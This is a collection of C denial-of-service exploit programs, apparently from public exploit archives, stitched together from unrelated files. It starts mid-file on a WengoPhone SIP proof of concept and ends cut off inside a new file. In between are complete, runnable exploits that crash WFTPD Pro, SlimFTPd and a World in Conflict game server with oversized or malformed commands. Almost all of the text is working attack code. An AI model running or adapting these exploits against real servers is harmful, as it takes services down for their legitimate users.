               hp = gethostbyname(host);
               if(!hp)
               {
                       printf("\nError: Unable to resolve hostname (%s)\n",host);
                       exit(1);
               }
               else
                       host_ip = *(u_long*)hp->h_addr ;
       }

       return(host_ip);
}

SOCKET udpsocket()
{
       /* network */
       SOCKET sockfd;
       struct sockaddr_in laddr, raddr;

       sockfd = socket(AF_INET, SOCK_DGRAM, 0);
       if (sockfd == -1)
               goto error;

       memset((char *) &laddr, 0, sizeof(laddr));
       laddr.sin_family = AF_INET;
       laddr.sin_addr.s_addr = htonl(INADDR_ANY);
       if (bind(sockfd, (struct sockaddr *) &laddr, sizeof(laddr)) == -1)
               goto error;

       return sockfd;

error:
#ifdef WIN32
       printf("Error:%d\n", GetLastError());
#endif
       return 0;
}


string &replace_all(string &str,const string& old_value,const string& new_value)
{
       while(true)
       {
               string::size_type   pos(0);
               if(   (pos=str.find(old_value))!=string::npos)
                       str.replace(pos,old_value.length(),new_value);
               else   break;
       }
       return   str;
}

string &replace_with_rand(string &str, char *value, int len)
{
       char *strspace = "0123456789";
       char randstr[100];
       for(int i=0; i<len; i++)
       {
               do
               {
                       randstr[i] = strspace[rand()%strlen(strspace)];
               }while(randstr[i] == '0');
       }
       randstr[len] = 0;
       replace_all(str, value, randstr);
       return str;
}

string build_packet(string _packet, char *addr, char *host)
{
       string packet = _packet;
       replace_all(packet, "[FROMADDR]", addr);
       replace_all(packet, "[TOADDR]", host);
       replace_all(packet, "[DOMAIN]", "www.nosec.org");
       replace_all(packet, "[FROMUSER]", "siprint");
       replace_with_rand(packet, "[CSEQ]", 9);
       replace_with_rand(packet, "[CALLID]", 9);
       replace_with_rand(packet, "[TAG]", 9);
       replace_with_rand(packet, "[BRANCH]", 9);
       return packet;
}

int main(int argc, char **argv)
{
       char *host;
       int port;
       char *localip;
       struct sockaddr_in sockaddr;
       struct sockaddr_in raddr;
       int sockaddrlen = sizeof(sockaddr);
       SOCKET s;

       printf("WengoPhone 2.1 Missing Content-Type DOS PoC\n");

       if(argc != 4)
       {
               printf("usage : %s <host> <port> <localip>\n", argv[0]);
               exit(-1);
       }

       host = argv[1];
       port = atoi(argv[2]);
       localip = argv[3];

       socket_init();
       s = udpsocket();
       if(s == 0)
       {
               printf("Create udp socket error!\n", host, port);
               return 1;
       }
       memset(&sockaddr, 0, sockaddrlen);
       getsockname(s, (struct sockaddr *) &sockaddr, (int *) &sockaddrlen);

       raddr.sin_family = AF_INET;
       raddr.sin_addr.S_un.S_addr = resolv(host);
       raddr.sin_port = htons(port);
       for(int i=0; i<20; i++)
       {
               char portstr[6] = {'\0'};
               string packet = build_packet(craft_pkt, localip, host);
               sprintf(portstr, "%d", ntohs(sockaddr.sin_port));
               replace_all(packet, "[LOCALPORT]", portstr);
               //printf("===========\n%s\n===========\n", packet.c_str());
               writeto(s, packet.c_str(), packet.length(), (struct sockaddr*)&raddr, sockaddrlen);
               Sleep(100);
       }

       return 0;
}

// milw0rm.com [2007-08-13]
source: http://www.securityfocus.com/bid/33426/info

WFTPD Pro is prone to multiple remote denial-of-service vulnerabilities because the application fails to handle specially crafted FTP commands in a proper manner.

Attackers can exploit these issues to crash the affected application, denying service to legitimate users.

WFTPD Pro 3.30.0.1 is vulnerable; other versions may also be affected.

UPDATE (January 29, 2009): This issue is reported to affect only servers that have the 'Enable Security' configuration option disabled. 

/*********************************************************************************************************\
*
*	Title: WFTPD Pro Server 3.30.0.1 (pre auth) Multiple Remote Denial of Service Vulnerabilities
*
*	Summary: Professional FTP server for Windows NT / 2000 / XP / 2003
*
*	Desc: WFTPD Pro Server 3.30.0.1 suffers from multiple remote vulnerabilities which resolves
*	in denial of service. Several commands are vulnerable including: LIST, MLST, NLST, NLST -al,
*	STAT and maybe more.
*
*	Product web page: http://www.wftpd.com/
*
*	Tested on Microsoft Windows XP Professional SP2 (English)
*
*	Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
*
*	liquidworm [t00t] gmail [w00t] com
*
*	http://www.zeroscience.org/
*
*	26.01.2009
*
\********************************************************************************************************/

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <netdb.h>

void header(void);

int main (int argc, char *argv[])
{
	int sckt = 0, sfd = 0;

	unsigned char payload[]=

	"\x4E\x4C\x53\x54\x20\x2D\x61\x6C\x20" // NLST -al
	// "\x4C\x49\x53\x54 - LIST, \x4D\x4C\x53\x54 - MLST, \x4E\x4C\x53\x54 - NLST, \x53\x54\x41\x54 - STAT +\x20
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
	"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41" // 1400 bytes
	"\xD\xA";

	header();
	
	if(argc != 2)
	{
		printf("\nUsage: %s [ip]\n\n", argv[0]);
		return (EXIT_SUCCESS);
	}
	
	struct sockaddr_in dos_ftp;
	sfd = socket(AF_INET, SOCK_STREAM, 0);
	if(sfd < 0)
	{
		perror("Socket");
		printf("Error creating socket...\n");
		return(1);
	} 
	
	printf("\n\n[+] Socket created!\n");
	sleep (1);

	memset(&dos_ftp, 0x0, sizeof(dos_ftp));
	dos_ftp.sin_family = AF_INET;
	dos_ftp.sin_addr.s_addr = inet_addr(argv[1]);
	dos_ftp.sin_port = htons(21);
	sckt = connect(sfd, (struct sockaddr *) &dos_ftp, sizeof(dos_ftp));
	if(sckt < 0)
	{
		perror("Connect");
		printf("Error connecting...\n");
		return(1);
	} 

	printf("[+] Connection established!\n");
	sleep (1);
	
	printf("[+] Sending malicious payload to %s ...\n", argv[1]);
	sleep(2);

	send(sfd, payload, sizeof(payload), 0);
	printf("[+] Malicious payload succesfully sent...\n");
	sleep (1);
	printf("[+] WFTPD on %s has crashed!\n\n", argv[1]);
	
	close (sfd);

	return(0);
}

void header()
{
	printf("\n--------------------------------------------------------------------------------\n\n");
	printf("\tWFTPD Pro Server 3.30.0.1 (pre auth) Remote Denial of Service Exploit\n");
	printf("\t\t\tby LiquidWorm <liquidworm [t00t] gmail [w00t ] com>\n\n");
	printf("--------------------------------------------------------------------------------\n\n");
}
/*
*-----------------------------------------------------------------------
* 
* wftpd.c - WFTPD Pro Server 3.21 MLST DoS Exploit
*
* Copyright (C) 2000-2004 HUC All Rights Reserved.
*
* Author   : lion
*             : lion cnhonker net
*             : www cnhonker com
* Date     : 2004-08-30
*
*-----------------------------------------------------------------------
*/

#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h> 

#pragma comment(lib, "ws2_32.lib")

#define FTPPORT      21
#define BUFFSIZE     204800
#define OVERFLOWSIZE 220
#define SIZE         2048      

// function
int create_socket();
int client_connect(int sockfd,char* server,int port);
int writebuf(char *s,int socket,char *buffer,int len);
int readbuf(char *s,int socket,char *buffer,int len);
void checkstatus(char *s);
void loginftp(SOCKET sockfd, char *user, char *pass);

int show = 1;
char recvbuf[BUFFSIZE];
char sendbuf[BUFFSIZE];

void main(int argc, char *argv[])
{
    WSADATA wsa;
    unsigned short    port;
    unsigned long     ip;
    char user[32] = "anonymous";
    char pass[32] = "anonymous";
    int i;
    
    char *command = "MLST ";

    SOCKET s;
    int size = OVERFLOWSIZE;

    printf("WFTPD Pro Server 3.21 MLST DoS Exploit\r\n");
        printf("lion lion#cnhonker.net, http://www.cnhonker.com\r\n\n");

    if(argc < 3)
    {
        printf("%s <TargetHost> <TargetPort>\r\n", argv[0]);
        return;
    }
    
    WSAStartup(MAKEWORD(2,2),&wsa);

    if((s=create_socket())==0) 
    {
        printf("[-] ERROR: Create socket failed.\r\n");
        return;
    }
      
    if(!client_connect(s, argv[1], atoi(argv[2])))
        exit(-1);
    
    loginftp(s, user, pass);
    
    memset(sendbuf, 0 ,BUFFSIZE);
    memcpy(sendbuf, "pasv\r\n", 6);
    writebuf("Send pasv", s, sendbuf, 6);
    readbuf("read", s, recvbuf, BUFFSIZE);
    
    for(i=0;i<60;i++,size++)
    {
        memset(sendbuf, 0, BUFFSIZE);
        memset(sendbuf, 'A', size);
        memcpy(sendbuf, command, strlen(command));
        sendbuf[size-2] ='\r';
        sendbuf[size-1] ='\n';
        
        printf("buff size :%d\r\n%s\r\n", strlen(sendbuf), sendbuf);
        show=1;
        writebuf("Send overflow buff", s, sendbuf, size);
        readbuf("read", s, recvbuf, BUFFSIZE);
        Sleep(500);
    }
    
    //send QUIT
    memset(sendbuf,0, BUFFSIZE);
    sprintf(sendbuf, "%s\r\n", "QUIT");
    writebuf("Send QUIT", s, sendbuf, strlen(sendbuf));
    
    //show=1;
    //readbuf("[+] QUIT......", s, recvbuf, BUFFSIZE);    
    //return;
        
    if(s)
        closesocket(s);
          
    WSACleanup();
}

int create_socket()
{  
    int sockfd;
  
    sockfd=socket(AF_INET,SOCK_STREAM,0);
    if(sockfd<0)
    {
        printf("[-] Create socket error.\r\n");
        return(0);
    }
    
    return(sockfd);    
}

int client_connect(int sockfd,char* server,int port)
{
    struct sockaddr_in cliaddr;
    struct hostent *host;

    if((host=gethostbyname(server))==NULL)
    {
        printf("[-] ERROR: gethostbyname(%s) error\n", server);
        return(-1);
    }      
    
    memset(&cliaddr, 0, sizeof(struct sockaddr));

    cliaddr.sin_family=AF_INET;
    cliaddr.sin_port=htons(port);
    cliaddr.sin_addr=*((struct in_addr *)host->h_addr);
    printf("[+] Trying %s:%d......", server, port);
    fflush(stdout);

    if(connect(sockfd,(struct sockaddr *)&cliaddr,sizeof(struct sockaddr))<0)
    {
        printf("FAILED!\r\n");
        closesocket(sockfd);
        return(-1);
    }

    printf("OK!\r\n");
    return(1);
}

int writebuf(char *s,int socket,char *buffer,int len)
{
    int j;

    if(s)
    {
        printf("[+] %s......", s);
        fflush(stdout);
    }    

    j=send(socket,buffer,len,0);
    if(j<=0)
    {
        printf("FAILED!\r\n");
            exit(-1);
    }    
    printf("OK!\r\n");
    return j;
}

int readbuf(char *s,int socket,char *buffer,int len)
{
    int a,b,i,j=0;
    
    a=b=i=0;
    memset(buffer,0,len);

    if(s)
    {
        printf("[+] %s......", s);
        fflush(stdout);
    }

    j=recv(socket,buffer,len-1,0);
    if(j <= 0)
    {
        if(s) printf("FAILED!\n");
            printf("[-] Recv data error.\n");
        exit(-1);
    }    
        
    if(s) printf("OK!\n");

    buffer[len-1]='\0';

    if(show==1)  printf("<==\r\n%s<==\r\n",buffer);

    return j;
}

void checkstatus(char *s)
{
    if(s==NULL) exit(-1);
    if(isdigit(*s))
    {
        if(s[0]=='5')
        {    
            printf("[-] Server told:%s\n",s);
            exit(-1);
        }
        else return;
    }

    printf("[-] Server said:%s\n",s);
    exit(-1);
}

void loginftp(SOCKET sockfd, char *user, char *pass)
{
    int j;
    
    show=1;
    readbuf("Get FTP Server banner",sockfd, recvbuf, SIZE);
    //show=0;

    //send USER username
    memset(sendbuf,0,BUFFSIZE);
    j=sprintf(sendbuf,"%s %s\r\n", "USER", user);
    writebuf("Send USER", sockfd,sendbuf,j);
    readbuf(NULL,sockfd, recvbuf, BUFFSIZE);
    checkstatus(recvbuf);

    //send PASS password
    memset(sendbuf,0,BUFFSIZE);
    j=sprintf(sendbuf,"%s %s\r\n","PASS", pass);
    writebuf("Send PASS", sockfd, sendbuf, j);
    readbuf(NULL,sockfd,recvbuf, BUFFSIZE);
    checkstatus(recvbuf);
    printf("[+] User %s logged in.\r\n", user);
}

// milw0rm.com [2004-08-31]
/************************************************************************
*WFTPD server <= 3.25 SITE ADMN DoS                                     *
*                                                                       *
*Sending command SITE ADMN + \32 makes server BOOM                      *
*                                                                       *
*usage: wftpd_dos.exe ip port user pass                                 *
*                                                                       *
*Coded by Marsu <Marsupilamipowa@hotmail.fr>                            *
************************************************************************/

#include "winsock2.h"
#include "stdio.h"
#include "stdlib.h"
#pragma comment(lib, "ws2_32.lib")

int main(int argc, char* argv[])
{
	struct hostent *he;
	struct sockaddr_in sock_addr;
	WSADATA wsa;
	int ftpsock;
	char recvbuff[1024];
	char evilbuff[100];
	int buflen=100;

	if (argc!=5)
	{
		printf("[+] Usage: %s <ip> <port> <user> <pass>\n",argv[0]);
		return 1;
	}
	WSACleanup();
	WSAStartup(MAKEWORD(2,0),&wsa);

	printf("[+] Connecting to %s:%s ... ",argv[1],argv[2]);
	if ((he=gethostbyname(argv[1])) == NULL) {
		printf("Failed\n[-] Could not init gethostbyname\n");
		return 1;
	}
	if ((ftpsock = socket(PF_INET, SOCK_STREAM, 0)) == -1) {
		printf("Failed\n[-] Socket error\n");
		return 1;
	}

	sock_addr.sin_family = PF_INET;
	sock_addr.sin_port = htons(atoi(argv[2]));
	sock_addr.sin_addr = *((struct in_addr *)he->h_addr);
	memset(&(sock_addr.sin_zero), '\0', 8);
	if (connect(ftpsock, (struct sockaddr *)&sock_addr, sizeof(struct sockaddr)) == -1) {
		printf("Failed\n[-] Sorry, cannot connect to %s:%s. Error: %i\n", argv[1],argv[2],WSAGetLastError());
		return 1;
	}
	printf("OK\n");
	memset(recvbuff,'\0',1024);
	recv(ftpsock, recvbuff, 1024, 0);

	memset(evilbuff,'\0',buflen);
	memcpy(evilbuff,"USER ",5);
	memcpy(evilbuff+5,argv[3],strlen(argv[3]));
	memcpy(evilbuff+5+strlen(argv[3]),"\r\n\0",3);
	printf("[+] Sending USER ... ");
	if (send(ftpsock,evilbuff,strlen(evilbuff),0)==-1) {
		printf("Failed\n[-] Could not send\n");
		return 1;
	}
	printf("OK\n");
	memset(recvbuff,'\0',1024);
	recv(ftpsock, recvbuff, 1024, 0);

	memset(evilbuff,'\0',buflen);
	memcpy(evilbuff,"PASS ",5);
	memcpy(evilbuff+5,argv[4],strlen(argv[4]));
	memcpy(evilbuff+5+strlen(argv[4]),"\r\n\0",3);

	printf("[+] Sending PASS ... ");
	if (send(ftpsock,evilbuff,strlen(evilbuff),0)==-1) {
		printf("Failed\n[-] Could not send\n");
		return 1;
	}
	printf("OK\n");
	recv(ftpsock, recvbuff, 1024, 0);

	memset(evilbuff,'\0',buflen);
	memcpy(evilbuff,"SITE ADMN ",10);
	memset(evilbuff+10,32,1);			//this char is powerfull :p
	memcpy(evilbuff+10+1,"\r\n\0",3);

	printf("[+] Sending SITE ADMN ... ");
	if (send(ftpsock,evilbuff,strlen(evilbuff),0)==-1) {
		printf("Failed\n[-] Could not send\n");
		return 1;
	}
	printf("OK\n");

	printf("[+] Host should be down\n");
	return 0;
}

// milw0rm.com [2007-01-14]
source: http://www.securityfocus.com/bid/14723/info

SlimFTPd is prone to a remote denial of service vulnerability. This issue is due to a failure in the application to handle exceptional conditions.

The problem presents itself during login. The application fails to handle malicious input in a proper manner resulting in a crash of the server, thus denying service to legitimate users. 

/*

Slim FTPd 3.17 Remote DoS PoC Exploit

Public proof of concept code by "Critical Security" http://www.critical.lt

Use for education only! Don't break the law...

Original Advisory may be found here: http://www.critical.lt/?vulnerabilities/8
Exploit compiles without warnings on FreeBSD 5.4-RELEASE
Tested against Slim FTPd 3.17 on Windows XP SP 2

Compilation:

mircia$ uname -sr
FreeBSD 5.4-RELEASE-p6
mircia$ gcc this_file.c -o expl
mircia$ ./expl localhost
here goes output

*/

#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>

#define PORT 21
#define USER "USER aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\r\n"  //
#define PASS "PASS aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\r\n" // Our dirty requests ;) 
#define QUIT "QUIT" // after all we just quit                    

int main(int argc, char *argv[]) {
  register int s;
  register int bytes;
  struct sockaddr_in sa;
  struct hostent *he;
  char buf[BUFSIZ+1];
  char *host;
  
  if ((s = socket(PF_INET, SOCK_STREAM, 0)) < 0) {
    perror("pizute");
    return 1;
  }

  bzero(&sa, sizeof sa);

  sa.sin_family = AF_INET;
  
  if (argc <= 1) {
  
  
  printf("%s%s%s","Usage: ",argv[0]," hostname or ip\n\n");
  
   } else {   
 
  host = (char *)argv[1];
  sa.sin_port = htons(PORT);

  if ((he = gethostbyname(host)) == NULL) {
    perror(host);
    return 2;
  }
  
  printf ("%s","\nCritical Security web-site: http://www.critical.lt\n");
  printf ("%s","Slim FTPd 3.17 lame PoC DoS exploit.\n");
  printf ("%s","greets to Lithuanian girlz :)\n\n"); 
  printf ("%s%s%s","[*] Initiating attack against ",host, "\n");
 
    bcopy(he->h_addr_list[0],&sa.sin_addr, he->h_length);

  if (connect(s, (struct sockaddr *)&sa, sizeof sa) < 0) {
    perror("connect");
    return 3;
  }

write(s,USER,sizeof USER); // dirty dirty dirty...
write(s,PASS,sizeof PASS);
write(s,QUIT,sizeof QUIT);

printf("%s","[*] Stuff sent, now wait for 30-120 seconds,\nserver should crash, if's not - try again or write a better code :P\n");



  close(s);
  return 0;

}}
/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.1"
#define PORT        48000
#define BUFFSZ      1364

#define DL          0x444c
#define UC          0x5543  // unsigned char
#define US          0x5553  // unsigned short
#define UI          0x5549  // unsigned int



int wic_send(int sd, u8 *data, int len);
int putcc(u8 *data, int chr, int len);
int putxx(u8 *data, u32 num, int bits);
u32 resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    struct  linger  ling = {1,1};
    int     sd;
    u16     port    = PORT;
    u8      buff[BUFFSZ],
            *p;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    fputs("\n"
        "World in Conflict <= 1.0.1.1 wrong type assert "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%hu)]\n"
            "\n", argv[0], port);
        exit(1);
    }

    if(argc > 2) port = atoi(argv[2]);
    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();
    if(connect(sd, (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();
    setsockopt(sd, SOL_SOCKET, SO_LINGER, (char *)&ling, sizeof(ling));

    p = buff;
    p += putxx(p, DL,   16);
    p += putxx(p, 317,  16);                                // out of order delimiter
    p += putxx(p, US,   16);    p += putxx(p, 35,   16);    // build number
    p += putxx(p, US,   16);    p += putxx(p, 126,  16);    // protocol version
    p += putxx(p, US,   16);    p += putxx(p, 6,    16);    // minor version
    p += putxx(p, 16,   16);    p += putcc(p, '\0', 16*2);  // utf16 password (set empty here)

    p += putxx(p, 0xA552, 16);  // failed assert

    // player join:
    // p += putxx(p, UC,   16);    p += putxx(p, 1,    8);     // slots 1 - 8
    // p += putxx(p, UI,   16);    p += putxx(p, 0,    32);
    // p += putxx(p, UI,   16);    p += putxx(p, 0,    32);
    // p += putxx(p, UI,   16);    p += putxx(p, 0,    32);
    // p += putxx(p, UI,   16);    p += putxx(p, 0,    32);
    // p += putxx(p, UC,   16);    p += putxx(p, 0,    8);
    // p += putxx(p, 25,   16);    p += putcc(p, 'a',  25*2);  // utf16 username
    // p += putxx(p, UI,   16);    p += putxx(p, 0,    32);
    wic_send(sd, buff, p - buff);

    close(sd);
    printf("- you must check the server manually to know if it's vulnerable or not\n");
    return(0);
}



int wic_send(int sd, u8 *data, int len) {
    u16     xlen;
    u8      tmp[2];

    xlen = len;
    xlen |= 0x4000; // out of order
    //xlen |= 0x8000; // zlib compression
    putxx(tmp, xlen, 16);
    if(send(sd, tmp, 2, 0) != 2) return(-1);
    if(len) {
        if(send(sd, data, len, 0) != len) return(-1);
    }
    return(0);
}



int putcc(u8 *data, int chr, int len) {
    memset(data, chr, len);
    return(len);
}



int putxx(u8 *data, u32 num, int bits) {
    int     i,
            bytes;

    bytes = bits >> 3;
    for(i = 0; i < bytes; i++) {
        data[i] = (num >> (i << 3));
    }
    return(bytes);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>

#ifdef WIN32
    #include <winsock.h>
